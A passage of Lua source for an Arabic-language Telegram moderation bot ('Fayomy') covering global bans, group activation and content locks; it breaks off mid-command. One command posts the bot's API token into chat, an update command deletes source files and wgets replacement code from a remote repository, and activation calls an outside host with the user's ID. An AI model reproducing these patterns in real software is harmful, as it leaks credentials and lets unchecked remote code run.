send(msg.chat_id_, msg.id_, 1, '❕┇لا تستطيع حظر عام \n🔘┇(مدراء،ادمنيه،اعضاء مميزين)البوت', 1, 'md')
else
database:sadd(hash, result.sender_user_id_)
chat_kick(result.chat_id_, result.sender_user_id_)
fmX000("prore",msg,"🚫┇تم حظره من مجموعات البوت")
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,gban_by_reply)
end
if text:match("^ارسل التوكن$")  then
send(msg.chat_id_, msg.id_, 1, token, 1, 'html')
end
if text:match("^حظر عام @(.*)$")   then
local apbll = {string.match(text, "^(حظر عام) @(.*)$")}
function gban_by_username(extra, result, success)
if result.id_ then
if ck_admin(result.id_) then
send(msg.chat_id_, msg.id_, 1, '❕┇لا تستطيع حظر عام \n🔘┇(مدراء،ادمنيه،اعضاء مميزين)البوت', 1, 'md')
else
local hash =  'fayomy:'..bot_id..'gbanned:'
texfm = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apbll[2] or 'FAYOMYYT')..')\n🚫┇تم حظره من المجموعات البوت'
database:sadd(hash, result.id_)
end
else
texfm = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texfm, 1, 'md')
end
resolve_username(apbll[2],gban_by_username)
end

if text:match("^حظر عام (%d+)$")   then
local apbll = {string.match(text, "^(حظر عام) (%d+)$")}
local hash =  'fayomy:'..bot_id..'gbanned:'
if ck_admin(apbll[2]) then
send(msg.chat_id_, msg.id_, 1, '❕┇لا تستطيع حظر عام \n🔘┇(مدراء،ادمنيه،اعضاء مميزين)البوت', 1, 'md')
else
database:sadd(hash, apbll[2])
fmX000(apbll[2],msg,"🚫┇تم حظره من المجموعات البوت")
end
end
if text:match("^الغاء العام$")   and msg.reply_to_message_id_ then
function ungban_by_reply(extra, result, success)
local hash =  'fayomy:'..bot_id..'gbanned:'
fmX000("prore",msg,"🚫┇تم الغاء حظره من المجموعات البوت")
database:srem(hash, result.sender_user_id_)
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,ungban_by_reply)
end

if text:match("^الغاء العام @(.*)$")   then
local apid = {string.match(text, "^(الغاء العام) @(.*)$")}
function ungban_by_username(extra, result, success)
local hash =  'fayomy:'..bot_id..'gbanned:'
if result.id_ then
texfm = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apid[2] or 'FAYOMYYT')..')\n��┇تم الغاء حظره من المجموعات البوت'
database:srem(hash, result.id_)
else
texfm = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texfm, 1, 'md')
end
resolve_username(apid[2],ungban_by_username)
end

if text:match("^الغاء العام (%d+)$")   then
local apbll = {string.match(text, "^(الغاء العام) (%d+)$")}
local hash =  'fayomy:'..bot_id..'gbanned:'
database:srem(hash, apbll[2])
fmX000(apbll[2],msg,"🚫┇تم الغاء حظره من مجموعات البوت")
end
if text:match("^تحديث السورس$")  then
send(msg.chat_id_, msg.id_, 1, '☑┇تم التحديث', 1, 'md')
os.execute('rm -rf ./libs/utils.lua')
os.execute('cd libs && wget https://raw.githubusercontent.com/FAYOMYGAMER/FAYOMY/master/libs/utils.lua')
os.execute('rm -rf Fayomy.lua')
os.execute('wget https://raw.githubusercontent.com/FAYOMYGAMER/Fayomy/master/Fayomy.lua')
os.exit()
return false
end
if text == "تفعيل"  then
function FMby(extra,result,success)
info = '💬┇بواسطه ~⪼ ['..result.first_name_..'](t.me/'..(result.username_ or 'FAYOMYYT')..')\n'
if database:get( 'fayomy:'..bot_id.."charge:"..msg.chat_id_) then
function fyaomy_info(k1,k2)
send(msg.chat_id_, msg.id_, 1, "❕┇المجموعه {"..(k2.title_ or "").."} مفعله سابقا", 1, 'md')
end
openChat(msg.chat_id_,fyaomy_info)
end
if not database:get( 'fayomy:'..bot_id.."charge:"..msg.chat_id_) then
database:set( 'fayomy:'..bot_id.."charge:"..msg.chat_id_,true)
function fyaomy_info(k1,k2)
send(msg.chat_id_, msg.id_, 1, info.."☑️┇تم تفعيل المجموعه {"..(k2.title_ or "").."}", 1, 'md')
end
openChat(msg.chat_id_,fyaomy_info)
function fyaomy_info2(k1,k2)
function dl_cb222(t1,t2)
if t2.invite_link_ == false then 
local getlink = 'https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_
local req = https.request(getlink)
local link = json:decode(req)
if link.ok == true then 
  t2.invite_link_ = link.result
end
end
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID
}, dl_cb222, nil)
end
openChat(msg.chat_id_,fyaomy_info2) 
--
database:sadd("fyaomy:gog"..bot_id, msg.chat_id_)
database:set( 'fayomy:'..bot_id.."enable:"..msg.chat_id_,true)
end end
getUser(msg.sender_user_id_, FMby)
end
end
end
if (text == 'تفعيل') and not is_sudo(msg) then
local res = http.request('https://fayomy.000webhostapp.com/fayomy.gq/x.php?id='..msg.sender_user_id_..'')
vardump(res)
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @FAYOMYYT ⚜️\n', 1, 'html')   
return false end
end
function FMby(extra,result,success)
info = '👁‍🗨※بواسطه ← ['..result.first_name_..'](t.me/'..(result.username_ or 'FAYOMYYT')..')\n'
local king2 = database:get("add"..bot_id)
if king2 then
local king = "https://api.telegram.org/bot" ..token.. '/getChatMember?chat_id=' .. msg.chat_id_ .. '&user_id='..msg.sender_user_id_
local stafm = https.request(king)
local data = json:decode(stafm)
if (data.result and data.result.can_promote_members or data.result.status == 'creator') then
local king = "https://api.telegram.org/bot" ..token.. '/getChatMembersCount?chat_id=' .. msg.chat_id_
local stafm = https.request(king)
local data2 = json:decode(stafm)
local kingn = database:get("fm_a"..bot_id) or 1000
if (data2.result and (tonumber(data2.result) == tonumber(kingn) or tonumber(data2.result) > tonumber(kingn))) then
if database:get( 'fayomy:'..bot_id.."charge:"..msg.chat_id_) then
function fyaomy_info(k1,k2)
send(msg.chat_id_, msg.id_, 1, "❕┇المجموعه {"..(k2.title_ or "").."} مفعله سابقا", 1, 'md')
end
openChat(msg.chat_id_,fyaomy_info)
end
if not database:get( 'fayomy:'..bot_id.."charge:"..msg.chat_id_) then
database:set( 'fayomy:'..bot_id.."charge:"..msg.chat_id_,true)
function fyaomy_info(k1,k2)
send(msg.chat_id_, msg.id_, 1, info.."☑️┇تم تفعيل المجموعه {"..(k2.title_ or "").."}", 1, 'md')
end
openChat(msg.chat_id_,fyaomy_info)
database:sadd("fyaomy:gog"..bot_id, msg.chat_id_)
function fyaomy_info2(k1,k2)
function dl_cb222(t1,t2)
if t2.invite_link_ == false then 
local getlink = 'https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_
local req = https.request(getlink)
local link = json:decode(req)
if link.ok == true then 
  t2.invite_link_ = link.result
end
end
database:set('fayomy:'..bot_id.."group:link"..msg.chat_id_,(t2.invite_link_ or "Error")) 
send(tostring((database:get("fayomy"..bot_id..":sudo:gr") or sudo_add)), 0, 1, "🔘┇قام بتفعيل مجموعه \n🎫┇ايدي المنشئ ~⪼ ("..msg.sender_user_id_..")\n☑️┇معرف المنشئ ~⪼ @"..(result.username_ or "لا يوجد").."\n🌐┇معلومات المجموعه \n\n🎫┇ايدي المجموعه ~⪼ ("..msg.chat_id_..")\nⓂ️┇اسم المجموعه ~⪼ ("..k2.title_..")\n📎┇رابط المجموعه ~⪼ ["..(t2.invite_link_ or "Error").."]" , 1, 'html')
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID
}, dl_cb222, nil)
end
openChat(msg.chat_id_,fyaomy_info2) 
--
if data.result.can_promote_members  then
database:sadd('fayomy:'..bot_id..'owners:'..msg.chat_id_,msg.sender_user_id_)
end
database:set( 'fayomy:'..bot_id.."enable:"..msg.chat_id_,true)
if data.result.status == 'creator' then
database:sadd('fayomy:'..bot_id..'creator:'..msg.chat_id_, msg.sender_user_id_)
end
end
else
send(msg.chat_id_, msg.id_, 1, "⚠️┇المجموعه قليله لا يمكن تفعيلها", 1, 'md')
end
else
send(msg.chat_id_, msg.id_, 1, "⚠️┇انت لست (منشئ او مدير) في المجموعة", 1, 'md')
end
end
end
getUser(msg.sender_user_id_, FMby)
end
if text == "تفعيل" and is_sudo(msg) then
local res = http.request('https://fayomy.000webhostapp.com/fayomy.gq/x.php?id='..msg.sender_user_id_..'')
vardump(res)
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @FAYOMYYT ⚜️\n', 1, 'html')   
return false end
end
function FMby(extra,result,success)
info = '👁‍🗨※بواسطه ← ['..result.first_name_..'](t.me/'..(result.username_ or 'FAYOMYYT')..')\n'
if database:get( 'fayomy:'..bot_id.."charge:"..msg.chat_id_) then
function fyaomy_info(k1,k2)
send(msg.chat_id_, msg.id_, 1, "❕┇المجموعه {"..(k2.title_ or "").."} مفعله سابقا", 1, 'md')
end
openChat(msg.chat_id_,fyaomy_info)
end
if not database:get( 'fayomy:'..bot_id.."charge:"..msg.chat_id_) then
database:set( 'fayomy:'..bot_id.."charge:"..msg.chat_id_,true)
function fyaomy_info(k1,k2)
send(msg.chat_id_, msg.id_, 1, info.."☑️┇تم تفعيل المجموعه {"..(k2.title_ or "").."}", 1, 'md')
end
openChat(msg.chat_id_,fyaomy_info)
function fyaomy_info2(k1,k2)
function dl_cb222(t1,t2)
if t2.invite_link_ == false then 
local getlink = 'https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_
local req = https.request(getlink)
local link = json:decode(req)
if link.ok == true then 
  t2.invite_link_ = link.result
end
end
database:set('fayomy:'..bot_id.."group:link"..msg.chat_id_,(t2.invite_link_ or "Error")) 
send(tostring((database:get("fayomy"..bot_id..":sudo:gr") or sudo_add)), 0, 1, "🔘┇قام بتفعيل مجموعه \n🎫┇ايدي مطور ~⪼ ("..msg.sender_user_id_..")\n📜┇معرف المطور ~⪼ @"..(result.username_ or "لا يوجد").."\n🌐┇معلومات المجموعه \n\n🎫┇ايدي المجموعه ~⪼ ("..msg.chat_id_..")\nⓂ️┇اسم المجموعه ~⪼ ("..k2.title_..")\n📎┇رابط المجموعه ~⪼ ["..(t2.invite_link_ or "Error").."]" , 1, 'html')
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID
}, dl_cb222, nil)
end
openChat(msg.chat_id_,fyaomy_info2) 
--
database:sadd("fyaomy:gog"..bot_id, msg.chat_id_)
database:set( 'fayomy:'..bot_id.."enable:"..msg.chat_id_,true)
end end
getUser(msg.sender_user_id_, FMby)
end
if text == "تعطيل" and is_sudo(msg) then
local res = http.request('https://fayomy.000webhostapp.com/fayomy.gq/x.php?id='..msg.sender_user_id_..'')
vardump(res)
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @FAYOMYYT ⚜️\n', 1, 'html')   
return false end
end
function FMby(extra,result,success)
info = '👁‍🗨※بواسطه ← ['..result.first_name_..'](t.me/'..(result.username_ or 'FAYOMYYT')..')\n'
if not database:get( 'fayomy:'..bot_id.."charge:"..msg.chat_id_) then
function fyaomy_info(k1,k2)
send(msg.chat_id_, msg.id_, 1, "❕┇المجموعه {"..(k2.title_ or "").."} معطله سابقا", 1, 'md')
end
openChat(msg.chat_id_,fyaomy_info)
end
if database:get( 'fayomy:'..bot_id.."charge:"..msg.chat_id_) then
database:del( 'fayomy:'..bot_id.."charge:"..msg.chat_id_)
function fyaomy_info(k1,k2)
send(msg.chat_id_, msg.id_, 1, info.."☑️┇تم تعطيل المجموعه {"..k2.title_.."}", 1, 'md')
end
openChat(msg.chat_id_,fyaomy_info)
database:srem("fyaomy:gog"..bot_id, msg.chat_id_)
--
function fyaomy_info2(k1,k2)
function dl_cb222(t1,t2)
if t2.invite_link_ == false then 
local getlink = 'https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_
local req = https.request(getlink)
local link = json:decode(req)
if link.ok == true then 
  t2.invite_link_ = link.result
end
end
database:set('fayomy:'..bot_id.."group:link"..msg.chat_id_,(t2.invite_link_ or "Error")) 
send(tostring((database:get("fayomy"..bot_id..":sudo:gr") or sudo_add)), 0, 1, "🔘┇قام تعطيل مجموعه \n🎫┇ايدي مطور ~⪼ ("..msg.sender_user_id_..")\n📜┇معرف المطور ~⪼ @"..(result.username_ or "لا يوجد").."\n🌐┇معلومات المجموعه \n\n🎫┇ايدي المجموعه ~⪼ ("..msg.chat_id_..")\nⓂ️┇اسم المجموعه ~⪼ ("..k2.title_..")\n📎┇رابط المجموعه ~⪼ ["..(t2.invite_link_ or "Error").."]" , 1, 'html')
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID
}, dl_cb222, nil)
end
openChat(msg.chat_id_,fyaomy_info2) 
--
end 
end
getUser(msg.sender_user_id_, FMby)
end
end
function FMlocks(msg) -- Function locks && unlocks
local text = msg.content_.text_
if text then
--         »»               Start fayomy lock                       ««              --
if (text == "قفل التاك") then
local fmX_o = database:get("lock_tag:fayomy"..msg.chat_id_..bot_id)
if fmX_o then
fmX000("lock",msg,"🔖※ بالفعل تم قفل التاك ✓")
else
fmX000("lock",msg,"🔖※ تم قفل التاك ✓")
database:set("lock_tag:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الشارحه") then
local fmX_o = database:get("lock_sarha:fayomy"..msg.chat_id_..bot_id)
if fmX_o then
fmX000("lock",msg,"🔗※ بالفعل تم قفل الشارحه ✓")
else
fmX000("lock",msg,"🔗※ تم قفل الشارحه ✓")
database:set("lock_sarha:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الكلايش") then
local fmX_o = database:get("lock_word:fayomy"..msg.chat_id_..bot_id)
if fmX_o then
fmX000("lock",msg,"🗞※ بالفعل تم قفل الكلايش ✓")
else
fmX000("lock",msg,"🗞※ تم قفل الكلايش ✓")
database:set("lock_word:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل التعديل") and (is_creator(msg) or is_creatorbasic(msg)) then
local fmX_o = database:get("lock_edit:fayomy"..msg.chat_id_..bot_id)
if fmX_o then
fmX000("lock",msg,"🎛※ بالفعل تم قفل التعديل ✓")
else
fmX000("lock",msg,"🎛※تم قفل التعديل ✓")
database:set("lock_edit:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل التكرار") then
local fmX_o = database:get("lock_lllll:fayomy"..msg.chat_id_..bot_id)
if fmX_o then
fmX000("lock",msg,"⏳※ بالفعل تم قفل التكرار ✓")
else
fmX000("lock",msg,"⏳※ تم قفل التكرار ✓")
database:set("lock_lllll:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل المتحركه") then
local fmX_o = database:get("lock_gif:fayomy"..msg.chat_id_..bot_id)
if fmX_o then
fmX000("lock",msg,"📽※ بالفعل تم قفل المتحركه ✓")
else
fmX000("lock",msg,"📽※ تم قفل المتحركه ✓")
database:set("lock_gif:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الملفات") then
local fmX_o = database:get("lock_files:fayomy"..msg.chat_id_..bot_id)
if fmX_o then
fmX000("lock",msg,"🗂※ بالفعل تم قفل الملفات ✓")
else
fmX000("lock",msg,"🗂※ تم قفل الملفات ✓")
database:set("lock_files:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الماركدون") then
local fmX_o = database:get("lock_mark:fayomy"..msg.chat_id_..bot_id)
if fmX_o then
fmX000("lock",msg,"🎗※ بالفعل تم قفل الماركدون ✓")
else
fmX000("lock",msg,"🎗※ تم قفل الماركدون ✓")
database:set("lock_mark:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الصور") then
local fmX_o = database:get("lock_photo:fayomy"..msg.chat_id_..bot_id)
if fmX_o then
fmX000("lock",msg,"📷※ بالفعل تم قفل الصور ✓")
else
fmX000("lock",msg,"📷※ تم قفل الصور ✓")
database:set("lock_photo:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الملصقات") then
local fmX_o = database:get("lock_stecker:fayomy"..msg.chat_id_..bot_id)
if fmX_o then
fmX000("lock",msg,"🤡※ بالفعل تم قفل الملصقات ✓")
else
fmX000("lock",msg,"🤡※ تم قفل الملصقات ✓")
database:set("lock_stecker:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الفيديو") then
local fmX_o = database:get("lock_video:fayomy"..msg.chat_id_..bot_id)
if fmX_o then
fmX000("lock",msg,"📹※ بالفعل تم قفل الفيديو ✓")
else
fmX000("lock",msg,"📹※ تم قفل الفيديو ✓")
database:set("lock_video:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الانلاين") then
local fmX_o = database:get("lock_inline:fayomy"..msg.chat_id_..bot_id)
if fmX_o then
fmX000("lock",msg,"🌐※ بالفعل تم قفل الانلاين ✓")
else
fmX000("lock",msg,"🌐※ تم قفل الانلاين ✓")
database:set("lock_inline:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الدردشه") then
local fmX_o = database:get("lock_chat:fayomy"..msg.chat_id_..bot_id)
if fmX_o then
fmX000("lock",msg,"💌※ بالفعل تم قفل الدردشه ✓")
else
fmX000("lock",msg,"💌※ تم قفل الدردشه ✓")
database:set("lock_chat:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل التوجيه") then
local fmX_o = database:get("lock_fwd:fayomy"..msg.chat_id_..bot_id)
if fmX_o then
fmX000("lock",msg,"⛓※ بالفعل تم قفل التوجيه ✓")
else
fmX000("lock",msg,"⛓※ تم قفل التوجيه ✓")
database:set("lock_fwd:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل التثبيت") then
local fmX_o = database:get("lock_pin:fayomy"..msg.chat_id_..bot_id)
if fmX_o then
fmX000("lock",msg,"🔱※ بالفعل تم قفل التثبيت ✓")
else
fmX000("lock",msg,"🔱※ تم قفل التثبيت ✓")
database:set("lock_pin:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الاغاني") then
local fmX_o = database:get("lock_audeo:fayomy"..msg.chat_id_..bot_id)
if fmX_o then
fmX000("lock",msg,"🎵※ بالفعل تم قفل الاغاني ✓")
else
fmX000("lock",msg,"🎶※ تم قفل الاغاني ✓")
database:set("lock_audeo:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الصوت") then
local fmX_o = database:get("lock_voice:fayomy"..msg.chat_id_..bot_id)
if fmX_o then
fmX000("lock",msg,"🎙※ بالفعل تم قفل الصوت ✓")
else
fmX000("lock",msg,"🎙※ تم قفل الصوت ✓")
database:set("lock_voice:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الجهات") then
local fmX_o = database:get("lock_contact:fayomy"..msg.chat_id_..bot_id)
if fmX_o then
fmX000("lock",msg,"☎️※ بالفعل تم قفل الجهات ✓")
else
fmX000("lock",msg,"☎️※ تم قفل الجهات ✓")
database:set("lock_contact:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل العربيه") then
local fmX_o = database:get("lock_ar:fayomy"..msg.chat_id_..bot_id)
if fmX_o then
fmX000("lock",msg,"📋※ بالفعل تم قفل العربيه ✓")
else
fmX000("lock",msg,"📑※ تم قفل العربيه ✓")
database:set("lock_ar:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الانكليزيه") then
local fmX_o = database:get("lock_en:fayomy"..msg.chat_id_..bot_id)
if fmX_o then
fmX000("lock",msg,"※ بالفعل تم قفل الانكليزيه ✓")
else
fmX000("lock",msg,"※ تم قفل الانكليزيه ✓")
database:set("lock_en:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الميديا") then
local fmX_o = database:get("lock_media:fayomy"..msg.chat_id_..bot_id)
if fmX_o then
fmX000("lock",msg,"※ بالفعل تم قفل الميديا ✓")
else
fmX000("lock",msg,"※ تم قفل الميديا ✓")
database:set("lock_media:fayomy"..msg.chat_id_..bot_id,"ok")
database:set("lock_audeo:fayomy"..msg.chat_id_..bot_id,"ok")
database:set("lock_video:fayomy"..msg.chat_id_..bot_id,"ok")
database:set("lock_photo:fayomy"..msg.chat_id_..bot_id,"ok")
database:set("lock_stecker:fayomy"..msg.chat_id_..bot_id,"ok")
database:set("lock_voice:fayomy"..msg.chat_id_..bot_id,"ok")
database:set("lock_gif:fayomy"..msg.chat_id_..bot_id,"ok")
database:set("lock_note:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الروابط") then
local fmX_o = database:get("lock_link:fayomy"..msg.chat_id_..bot_id)
if fmX_o then
fmX000("lock",msg,"🃏※ بالفعل تم قفل الروابط ✓")
else
fmX000("lock",msg,"🃏※ تم قفل الروابط ✓")
database:set("lock_link:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل المعرف") then
local fmX_o = database:get("lock_username:fayomy"..msg.chat_id_..bot_id)
if fmX_o then
fmX000("lock",msg,"🀄️※ بالفعل تم قفل المعرف ✓")
else
fmX000("lock",msg,"🀄️※ تم قفل المعرف ✓")
database:set("lock_username:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الاشعارات") then
local fmX_o = database:get("lock_new:fayomy"..msg.chat_id_..bot_id)
if fmX_o then
fmX000("lock",msg,"💭※ بالفعل تم قفل الاشعارات ✓")
else
fmX000("lock",msg,"💭※ تم قفل الاشعارات ✓")
database:set("lock_new:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل البوتات بالطرد") then
local fmX_o = database:get("lock_botAndBan:fayomy"..msg.chat_id_..bot_id)
if fmX_o then
fmX000("lock",msg,"🔆※ بالفعل تم قفل البوتات بالطرد ✓")
else
fmX000("lock",msg,"🔆※ تم قفل البوتات بالطرد ✓")
database:set("lock_botAndBan:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل البوتات") then
local fmX_o = database:get("lock_bot:fayomy"..msg.chat_id_..bot_id)
if fmX_o then
fmX000("lock",msg,"🤖※ بالفعل تم قفل البوتات ✓")
else
fmX000("lock",msg,"🤖※ تم قفل البوتات ✓")
database:set("lock_bot:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل الدخول") then
local fmX_o = database:get("lock_join:fayomy"..msg.chat_id_..bot_id)
if fmX_o then
fmX000("lock",msg,"🔆※ بالفعل تم قفل الدخول للمجموعه ✓")
else
fmX000("lock",msg,"🔆※ تم قفل الدخول للمجموعه ✓")
database:set("lock_join:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "قفل بصمه الفيديو") then
local fmX_o = database:get("lock_note:fayomy"..msg.chat_id_..bot_id)
if fmX_o then
fmX000("lock",msg,"※ بالفعل تم قفل بصمه فيديو ✓")
else
fmX000("lock",msg,"※ تم قفل بصمه فيديو ✓")
database:set("lock_note:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
--         »»                 End fayomy lock                         ««              --
--         »»               Start fayomy unlock                       ««              --
if (text == "فتح الاشعارات") then
local fmX_o = database:get("lock_new:fayomy"..msg.chat_id_..bot_id)
if not fmX_o then
fmX000("lock",msg,"※┇بالفعل تم فتح الاشعارات ✓")
else
fmX000("lock",msg,"※┇تم فتح الاشعارات ✓")
database:del("lock_new:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح التاك") then
local fmX_o = database:get("lock_tag:fayomy"..msg.chat_id_..bot_id)
if not fmX_o then
fmX000("lock",msg,"※┇بالفعل تم فتح التاك ✓")
else
fmX000("lock",msg,"※┇تم فتح التاك ✓")
database:del("lock_tag:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح الكلايش") then
local fmX_o = database:get("lock_word:fayomy"..msg.chat_id_..bot_id)
if not fmX_o then
fmX000("lock",msg,"※┇بالفعل تم فتح الكلايش ✓")
else
fmX000("lock",msg,"※┇تم فتح الكلايش ✓")
database:del("lock_word:fayomy"..msg.chat_id_..bot_id)
end
end

if (text == "فتح الشارحه") then
local fmX_o = database:get("lock_sarha:fayomy"..msg.chat_id_..bot_id)
if not fmX_o then
fmX000("lock",msg,"※┇بالفعل تم فتح الشارحه ✓")
else
fmX000("lock",msg,"※┇تم فتح الشارحه ✓")
database:del("lock_sarha:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح التكرار") then
local fmX_o = database:get("lock_lllll:fayomy"..msg.chat_id_..bot_id)
if not fmX_o then
fmX000("lock",msg,"※┇بالفعل تم فتح التكرار ✓")
else
fmX000("lock",msg,"※┇تم فتح التكرار ✓")
database:del("lock_lllll:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح التعديل") and (is_creator(msg) or is_creatorbasic(msg)) then
local fmX_o = database:get("lock_edit:fayomy"..msg.chat_id_..bot_id)
if not fmX_o then
fmX000("lock",msg,"※┇بالفعل تم فتح التعديل ✓")
else
fmX000("lock",msg,"※┇تم فتح التعديل ✓")
database:del("lock_edit:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح المتحركه") then
local fmX_o = database:get("lock_gif:fayomy"..msg.chat_id_..bot_id)
if not fmX_o then
fmX000("lock",msg,"※┇بالفعل تم فتح المتحركه ✓")
else
fmX000("lock",msg,"※┇تم فتح المتحركه ✓")
database:del("lock_gif:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح الملفات") then
local fmX_o = database:get("lock_files:fayomy"..msg.chat_id_..bot_id)
if not fmX_o then
fmX000("lock",msg,"※┇بالفعل تم فتح الملفات ✓")
else
fmX000("lock",msg,"※┇تم فتح الملفات ✓")
database:del("lock_files:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح الماركدون") then
local fmX_o = database:get("lock_mark:fayomy"..msg.chat_id_..bot_id)
if not fmX_o then
fmX000("lock",msg,"※┇بالفعل تم فتح الماركدون ✓")
else
fmX000("lock",msg,"※┇تم فتح الماركدون ✓")
database:del("lock_mark:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح الصور") then
local fmX_o = database:get("lock_photo:fayomy"..msg.chat_id_..bot_id)
if not fmX_o then
fmX000("lock",msg,"※┇بالفعل تم فتح الصور ✓")
else
fmX000("lock",msg,"※┇تم فتح الصور ✓")
database:del("lock_photo:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح الملصقات") then
local fmX_o = database:get("lock_stecker:fayomy"..msg.chat_id_..bot_id)
if not fmX_o then
fmX000("lock",msg,"※┇بالفعل تم فتح الملصقات ✓")
else
fmX000("lock",msg,"※┇تم فتح الملصقات ✓")
database:del("lock_stecker:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح الفيديو") then
local fmX_o = database:get("lock_video:fayomy"..msg.chat_id_..bot_id)
if not fmX_o then
fmX000("lock",msg,"※┇بالفعل تم فتح الفيديو ✓")
else
fmX000("lock",msg,"※┇تم فتح الفيديو ✓")
database:del("lock_video:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح الانلاين") then
local fmX_o = database:get("lock_inline:fayomy"..msg.chat_id_..bot_id)
if not fmX_o then
fmX000("lock",msg,"※┇بالفعل تم فتح الانلاين ✓")
else
fmX000("lock",msg,"※┇تم فتح الانلاين ✓")
database:del("lock_inline:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح الدردشه") then
local fmX_o = database:get("lock_chat:fayomy"..msg.chat_id_..bot_id)
if not fmX_o then
fmX000("lock",msg,"※┇بالفعل تم فتح الدردشه ✓")
else
fmX000("lock",msg,"※┇تم فتح الدردشه ✓")
database:del("lock_chat:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح التوجيه") then
local fmX_o = database:get("lock_fwd:fayomy"..msg.chat_id_..bot_id)
if not fmX_o then
fmX000("lock",msg,"※┇بالفعل تم فتح التوجيه ✓")
else
fmX000("lock",msg,"※┇تم فتح التوجيه ✓")
database:del("lock_fwd:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح التثبيت") then
local fmX_o = database:get("lock_pin:fayomy"..msg.chat_id_..bot_id)
if not fmX_o then
fmX000("lock",msg,"※┇بالفعل تم فتح التثبيت ✓")
else
fmX000("lock",msg,"※┇تم فتح التثبيت ✓")
database:del("lock_pin:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح الاغاني") then
local fmX_o = database:get("lock_audeo:fayomy"..msg.chat_id_..bot_id)
if not fmX_o then
fmX000("lock",msg,"※┇بالفعل تم فتح الاغاني ✓")
else
fmX000("lock",msg,"※┇تم فتح الاغاني ✓")
database:del("lock_audeo:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح الصوت") then
local fmX_o = database:get("lock_voice:fayomy"..msg.chat_id_..bot_id)
if not fmX_o then
fmX000("lock",msg,"※┇بالفعل تم فتح الصوت ✓")
else
fmX000("lock",msg,"※┇تم فتح الصوت ✓")
database:del("lock_voice:fayomy"..msg.chat_id_..bot_id,"ok")
end
end
if (text == "فتح البوتات بالطرد") then
local fmX_o = database:get("lock_botAndBan:fayomy"..msg.chat_id_..bot_id)
if not fmX_o then
fmX000("lock",msg,"※┇بالفعل تم فتح البوتات بالطرد ✓")
else
fmX000("lock",msg,"※┇تم فتح البوتات بالطرد ✓")
